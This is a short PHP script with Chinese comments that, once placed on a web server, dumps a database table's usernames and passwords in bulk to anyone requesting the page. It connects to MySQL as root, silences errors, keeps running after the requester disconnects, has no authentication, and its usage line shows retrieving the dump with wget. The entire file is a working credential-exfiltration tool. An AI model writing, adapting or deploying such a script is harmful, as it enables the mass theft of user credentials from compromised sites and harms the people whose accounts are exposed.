<?php
//author: By Gavin
//Usage: wget "http://xxx.com/wget_sql.php?sn=0&en=5000000&ln=50000" -O gavin.sql

error_reporting(0);
ignore_user_abort();
set_time_limit(0);
ob_clean();

//配置数据库信息
$DB_Server="127.0.0.1:3306";
$DB_User="root";
$DB_Pass="root";
$DB_Name="DBName";

//分段每次limit查询出来的条数,根据实际情况调整，默认为2w
$max_limit_num = 20000;
//最大缓存条数，防止占用过多内存，根据每条数据大小调整
$max_cache_num = 5000;


$gavin_start_num = intval($_GET['sn']);                    //接收起始条数
$gavin_end_num = intval($_GET['en']);                    //接收结束条数
if (intval($_GET['ln'])) $max_limit_num = intval($_GET['ln']);        //接收每次分段查询的条数
 $gavin_down_num = intval($gavin_end_num - $gavin_start_num);         //计算总下载条数

if ($gavin_end_num < $max_limit_num) $max_limit_num = $gavin_end_num;
$beishu = intval($gavin_down_num/$max_limit_num);
$yushu = intval($gavin_down_num%$max_limit_num);

$conn=@mysql_connect($DB_Server,$DB_User,$DB_Pass);
if ($conn==FALSE) {
    echo "数据库连接出错!<br>";
    exit();
    }
if (@mysql_select_db($DB_Name,$conn)==FALSE) {
        echo "打开数据库:".$DB_Name." 失败!";
        exit();
    }

mysql_query("set names 'utf8'");
$num = 1;
$out_put_str = '';
if (ob_get_level() == 0) ob_start();

for ($i=0;$i<$beishu;$i++){
  $new_start_num = $i*$max_limit_num+$gavin_start_num;
  if ($i == ($beishu-1)) $max_limit_num += $yushu;
  $sql = "select username,password from `table_name` limit ".$new_start_num.",".$max_limit_num; //配置SQL语句
   $res = mysql_query($sql) or die(mysql_error());
  while($result = mysql_fetch_array($res))
  {
    $num ++;
    $out_put_str = $result["username"]."-->".$result["password"]."\n";  //格式化脱出的数据,根据SQL中的字段调整
     if ($num >= $max_cache_num){
      @ob_end_flush();
      $num = 0;
    }
    echo $out_put_str;
    // unset($out_put_str);
  }
}
?>